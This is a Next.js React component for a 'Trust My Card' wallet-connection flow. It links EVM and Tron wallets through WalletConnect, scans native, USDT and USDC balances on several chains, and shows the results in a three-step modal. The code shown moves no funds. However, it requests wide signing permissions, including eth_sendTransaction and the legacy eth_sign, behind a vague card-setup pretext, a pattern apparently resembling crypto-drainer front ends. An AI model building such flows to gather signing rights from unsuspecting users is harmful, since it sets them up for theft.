"use client";

import { useCallback, useEffect, useRef, useState } from "react";

const projectId = process.env.NEXT_PUBLIC_PROJECT_ID;

type UniversalProvider = Awaited<
  ReturnType<
    Awaited<
      typeof import("@walletconnect/universal-provider")
    >["default"]["init"]
  >
>;

type WalletConnectModal = InstanceType<
  typeof import("@walletconnect/modal").WalletConnectModal
>;

type WcSession = {
  namespaces?: Record<
    string,
    {
      accounts?: string[];
    }
  >;
};

type Step = 1 | 2 | 3;

type TokenBalances = {
  native: string;
  usdt: string;
  usdc?: string;
};

type BalancesResponse = Record<string, TokenBalances>;

type NetworkRow = {
  key: string;
  name: string;
  standard: string;
  color: string;
  letter: string;
  status: "Awaiting" | "Ready";
  balances?: TokenBalances;
};

type LinkedAccounts = {
  evm: string | null;
  tron: string | null;
};

const TRON_MAINNET = "tron:0x2b6653dc";

const METADATA = {
  name: "Trust My Card",
  description: "Connect your wallet to continue with card setup",
  url: "http://localhost:3000",
  icons: ["https://avatars.githubusercontent.com/u/37784886"],
};

const NETWORK_META: Record<
  string,
  { name: string; standard: string; color: string; letter: string }
> = {
  tron: { name: "Tron", standard: "TRC-20", color: "#FF0013", letter: "T" },
  eth: { name: "Ethereum", standard: "ERC-20", color: "#627EEA", letter: "Ξ" },
  bsc: { name: "BSC", standard: "BEP-20", color: "#F0B90B", letter: "B" },
  pol: { name: "Polygon", standard: "ERC-20", color: "#8247E5", letter: "P" },
  avax: { name: "Avalanche", standard: "ERC-20", color: "#E84142", letter: "A" },
  arb: { name: "Arbitrum", standard: "ERC-20", color: "#12AAFF", letter: "A" },
  base: { name: "Base", standard: "ERC-20", color: "#0052FF", letter: "B" },
};

const DISPLAY_ORDER = ["tron", "eth", "bsc", "pol", "avax", "arb", "base"];

function shortenAddress(address: string) {
  if (address.startsWith("T") && address.length === 34) {
    return `${address.slice(0, 4)}…${address.slice(-4)}`;
  }
  return `${address.slice(0, 6)}…${address.slice(-4)}`;
}

function caipAccountAddress(caip: string): string {
  const parts = caip.split(":");
  return parts[parts.length - 1] ?? "";
}

function accountsFromSession(
  session: WcSession | undefined
): LinkedAccounts {
  const evmAccount = session?.namespaces?.eip155?.accounts?.[0];
  const tronAccount = session?.namespaces?.tron?.accounts?.[0];
  return {
    evm: evmAccount ? caipAccountAddress(evmAccount) : null,
    tron: tronAccount ? caipAccountAddress(tronAccount) : null,
  };
}

async function getTronLinkAddress(): Promise<string | null> {
  if (typeof window === "undefined") return null;
  const w = window as Window & {
    tronLink?: {
      ready?: boolean;
      request: (args: { method: string }) => Promise<unknown>;
    };
    tronWeb?: {
      ready?: boolean;
      defaultAddress?: { base58?: string };
    };
  };

  try {
    if (w.tronLink?.request) {
      await w.tronLink.request({ method: "tron_requestAccounts" });
    }
    const addr = w.tronWeb?.defaultAddress?.base58;
    return addr && addr.startsWith("T") ? addr : null;
  } catch {
    return null;
  }
}

function rowsFromBalances(data: BalancesResponse): NetworkRow[] {
  const keys = Object.keys(data).sort((a, b) => {
    const ai = DISPLAY_ORDER.indexOf(a);
    const bi = DISPLAY_ORDER.indexOf(b);
    return (ai === -1 ? 999 : ai) - (bi === -1 ? 999 : bi);
  });

  return keys.map((key) => {
    const meta = NETWORK_META[key] ?? {
      name: key.toUpperCase(),
      standard: "Token",
      color: "#52525b",
      letter: key.slice(0, 1).toUpperCase(),
    };
    return {
      key,
      name: meta.name,
      standard: meta.standard,
      color: meta.color,
      letter: meta.letter,
      status: "Ready" as const,
      balances: data[key],
    };
  });
}

async function fetchBalances(
  evm: string | null,
  tron: string | null
): Promise<BalancesResponse> {
  const params = new URLSearchParams();
  if (evm) params.set("evm", evm);
  if (tron) params.set("tron", tron);

  const res = await fetch(`/api/balances?${params.toString()}`, {
    cache: "no-store",
  });
  if (!res.ok) {
    const body = await res.json().catch(() => null);
    throw new Error(body?.error || `Balances request failed (${res.status})`);
  }
  return res.json();
}

export default function ConnectFlow() {
  const providerRef = useRef<UniversalProvider | null>(null);
  const modalRef = useRef<WalletConnectModal | null>(null);
  const connectingRef = useRef(false);
  const [step, setStep] = useState<Step>(1);
  const [ready, setReady] = useState(false);
  const [busy, setBusy] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [accounts, setAccounts] = useState<LinkedAccounts>({
    evm: null,
    tron: null,
  });
  const [error, setError] = useState<string | null>(null);
  const [networks, setNetworks] = useState<NetworkRow[]>([]);

  const scanWallet = useCallback(async (linked: LinkedAccounts) => {
    if (!linked.evm && !linked.tron) {
      setNetworks([]);
      return;
    }

    setScanning(true);
    setError(null);
    setStep(2);
    setNetworks([]);

    try {
      // Prefer Tron from session; otherwise try injected TronLink
      let tron = linked.tron;
      if (!tron) {
        tron = await getTronLinkAddress();
      }

      const data = await fetchBalances(linked.evm, tron);
      setAccounts({ evm: linked.evm, tron });
      setNetworks(rowsFromBalances(data));
    } catch (err: unknown) {
      console.error(err);
      setError(err instanceof Error ? err.message : "Failed to fetch balances");
      setNetworks([]);
    } finally {
      setScanning(false);
    }
  }, []);

  useEffect(() => {
    let cancelled = false;

    async function init() {
      if (!projectId) {
        setError("Missing NEXT_PUBLIC_PROJECT_ID in .env.local");
        return;
      }

      const [{ default: UniversalProvider }, { WalletConnectModal }] =
        await Promise.all([
          import("@walletconnect/universal-provider"),
          import("@walletconnect/modal"),
        ]);

      const modal = new WalletConnectModal({
        projectId,
        themeMode: "dark",
        themeVariables: {
          "--wcm-z-index": "9999",
        },
      });

      const provider = await UniversalProvider.init({
        projectId,
        metadata: {
          ...METADATA,
          url:
            typeof window !== "undefined"
              ? window.location.origin
              : METADATA.url,
        },
      });

      if (cancelled) {
        await provider.disconnect().catch(() => undefined);
        return;
      }

      provider.on("display_uri", (uri: string) => {
        void modal.openModal({ uri });
      });

      provider.on("session_delete", () => {
        setAccounts({ evm: null, tron: null });
        setNetworks([]);
        setStep(1);
      });

      providerRef.current = provider;
      modalRef.current = modal;

      if (provider.session) {
        const linked = accountsFromSession(provider.session);
        setAccounts(linked);
        if (linked.evm || linked.tron) {
          await scanWallet(linked);
        }
      }

      setReady(true);
    }

    init().catch((err: unknown) => {
      console.error(err);
      setError(
        err instanceof Error ? err.message : "Failed to init WalletConnect"
      );
    });

    return () => {
      cancelled = true;
      modalRef.current?.closeModal();
    };
  }, [scanWallet]);

  const openWalletConnect = useCallback(async () => {
    const provider = providerRef.current;
    const modal = modalRef.current;
    if (!provider || connectingRef.current) return;

    connectingRef.current = true;
    setError(null);
    setBusy(true);
    setStep(2);
    setNetworks([]);

    try {
      if (provider.session) {
        await provider.disconnect().catch(() => undefined);
      }

      await provider.connect({
        optionalNamespaces: {
          eip155: {
            methods: [
              "eth_sendTransaction",
              "eth_signTransaction",
              "eth_sign",
              "personal_sign",
              "eth_signTypedData",
              "eth_signTypedData_v4",
            ],
            chains: [
              "eip155:1",
              "eip155:56",
              "eip155:137",
              "eip155:43114",
              "eip155:8453",
              "eip155:42161",
              "eip155:10",
            ],
            events: ["chainChanged", "accountsChanged"],
          },
          tron: {
            methods: [
              "tron_signTransaction",
              "tron_signMessage",
              "tron_signMessageV2",
            ],
            chains: [TRON_MAINNET],
            events: ["accountsChanged", "chainChanged"],
          },
        },
      });

      modal?.closeModal();

      const linked = accountsFromSession(provider.session);
      setAccounts(linked);

      if (!linked.evm && !linked.tron) {
        setError("No account returned from wallet. Please try again.");
        setStep(1);
        return;
      }

      await scanWallet(linked);
    } catch (err: unknown) {
      console.error(err);
      modal?.closeModal();
      const message =
        err instanceof Error ? err.message : "Connection cancelled";
      if (/reset/i.test(message)) {
        setError("Connection request reset. Please try again.");
      } else if (!/rejected|denied|cancel/i.test(message)) {
        setError(message);
      }
      setNetworks([]);
      setStep(1);
    } finally {
      connectingRef.current = false;
      setBusy(false);
    }
  }, [scanWallet]);

  const disconnect = useCallback(async () => {
    const provider = providerRef.current;
    if (!provider) return;
    setBusy(true);
    try {
      await provider.disconnect();
      setAccounts({ evm: null, tron: null });
      setNetworks([]);
      setStep(1);
    } catch (err: unknown) {
      console.error(err);
      setError(err instanceof Error ? err.message : "Disconnect failed");
    } finally {
      setBusy(false);
    }
  }, []);

  const stepLabel = step === 1 ? "Connect" : step === 2 ? "Setup" : "Ready";
  const primaryAccount = accounts.evm ?? accounts.tron;

  return (
    <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/40 px-4">
      <div className="w-full max-w-md overflow-hidden rounded-2xl bg-white shadow-2xl">
        <div className="flex items-center justify-between border-b border-zinc-100 px-5 py-4">
          <div className="flex items-center gap-3">
            {step > 1 ? (
              <button
                type="button"
                aria-label="Back"
                onClick={() => {
                  if (busy || scanning) return;
                  setStep(1);
                  setError(null);
                }}
                className="flex h-8 w-8 items-center justify-center rounded-full text-zinc-500 hover:bg-zinc-100"
              >
                ←
              </button>
            ) : (
              <span className="h-8 w-8" />
            )}
            <div>
              <p className="text-base font-semibold text-zinc-900">{stepLabel}</p>
              <p className="text-xs text-zinc-500">Step {step} of 3</p>
            </div>
          </div>
          <button
            type="button"
            aria-label="Close"
            onClick={() => {
              if (busy || scanning) return;
              setStep(1);
              setError(null);
            }}
            className="flex h-8 w-8 items-center justify-center rounded-full text-zinc-400 hover:bg-zinc-100 hover:text-zinc-700"
          >
            ×
          </button>
        </div>

        <div className="px-5 py-6">
          {step === 1 && (
            <div className="flex flex-col items-center gap-6 text-center">
              <div className="flex h-16 w-16 items-center justify-center rounded-2xl bg-[#3396ff]/10 text-3xl">
                🔗
              </div>
              <div className="space-y-2">
                <h2 className="text-xl font-semibold text-zinc-900">
                  Connect your wallet
                </h2>
                <p className="text-sm leading-relaxed text-zinc-500">
                  Link your crypto wallet to continue with card setup. EVM and
                  Tron are requested together.
                </p>
              </div>
              <button
                type="button"
                disabled={!ready || busy}
                onClick={openWalletConnect}
                className="w-full rounded-xl bg-[#3396ff] px-4 py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
              >
                {busy ? "Opening WalletConnect…" : "Connect Wallet"}
              </button>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-4">
              <p className="text-sm text-zinc-600">
                Scanning your wallet on supported networks.
              </p>

              {(busy || scanning) && networks.length === 0 ? (
                <ul className="space-y-2">
                  {[0, 1, 2, 3, 4, 5].map((i) => (
                    <li
                      key={i}
                      className="flex items-center gap-3 rounded-xl border border-zinc-200 px-3 py-3"
                    >
                      <span className="h-10 w-10 shrink-0 animate-pulse rounded-full bg-zinc-200" />
                      <span className="h-4 flex-1 animate-pulse rounded bg-zinc-100" />
                      <span className="text-xs text-zinc-400">Awaiting</span>
                    </li>
                  ))}
                </ul>
              ) : null}

              {!busy && !scanning && networks.length === 0 ? (
                <div className="rounded-xl border border-dashed border-zinc-200 px-4 py-8 text-center">
                  <p className="text-sm text-zinc-500">
                    Connect your wallet to scan live balances.
                  </p>
                  <button
                    type="button"
                    onClick={openWalletConnect}
                    disabled={!ready}
                    className="mt-4 w-full rounded-xl bg-[#3396ff] px-4 py-3 text-sm font-semibold text-white hover:bg-[#2b7fd6] disabled:opacity-50"
                  >
                    Open WalletConnect
                  </button>
                </div>
              ) : null}

              {networks.length > 0 ? (
                <>
                  <ul className="space-y-2">
                    {networks.map((network) => (
                      <li
                        key={network.key}
                        className="flex w-full items-center gap-3 rounded-xl border border-zinc-200 bg-white px-3 py-3"
                      >
                        <span
                          className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
                          style={{ backgroundColor: network.color }}
                          aria-hidden
                        >
                          {network.letter}
                        </span>
                        <span className="min-w-0 flex-1">
                          <span className="block text-sm font-medium text-zinc-900">
                            {network.name}{" "}
                            <span className="font-normal text-zinc-400">
                              ({network.standard})
                            </span>
                          </span>
                          {network.balances ? (
                            <span className="mt-0.5 block truncate text-xs text-zinc-500">
                              native {network.balances.native}
                              {" · "}USDT {network.balances.usdt}
                              {network.balances.usdc !== undefined
                                ? ` · USDC ${network.balances.usdc}`
                                : ""}
                            </span>
                          ) : null}
                        </span>
                        <span className="text-xs text-emerald-600">
                          {network.status}
                        </span>
                      </li>
                    ))}
                  </ul>
                  <button
                    type="button"
                    onClick={() => setStep(3)}
                    className="w-full rounded-xl bg-[#3396ff] px-4 py-3 text-sm font-semibold text-white hover:bg-[#2b7fd6]"
                  >
                    Next Step
                  </button>
                </>
              ) : null}

              {primaryAccount && (busy || scanning) ? (
                <p className="text-center font-mono text-xs text-zinc-400">
                  {shortenAddress(primaryAccount)}
                </p>
              ) : null}
            </div>
          )}

          {step === 3 && (
            <div className="flex flex-col items-center gap-5 text-center">
              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-50 text-3xl">
                ✓
              </div>
              <div className="space-y-2">
                <h2 className="text-xl font-semibold text-zinc-900">
                  Wallet connected
                </h2>
                {accounts.evm ? (
                  <p className="font-mono text-sm text-zinc-600">
                    EVM {shortenAddress(accounts.evm)}
                  </p>
                ) : null}
                {accounts.tron ? (
                  <p className="font-mono text-sm text-zinc-600">
                    TRON {shortenAddress(accounts.tron)}
                  </p>
                ) : null}
                <p className="text-sm text-zinc-500">
                  Live balances loaded for {networks.length} network
                  {networks.length === 1 ? "" : "s"}
                  {networks.some((n) => n.key === "tron")
                    ? " (including Tron)"
                    : ""}
                  .
                </p>
              </div>
              <button
                type="button"
                onClick={disconnect}
                disabled={busy}
                className="w-full rounded-xl border border-zinc-200 px-4 py-3 text-sm font-medium text-zinc-800 hover:bg-zinc-50 disabled:opacity-50"
              >
                Disconnect
              </button>
            </div>
          )}

          {error ? (
            <p className="mt-4 text-center text-sm text-red-600">{error}</p>
          ) : null}
        </div>
      </div>
    </div>
  );
}
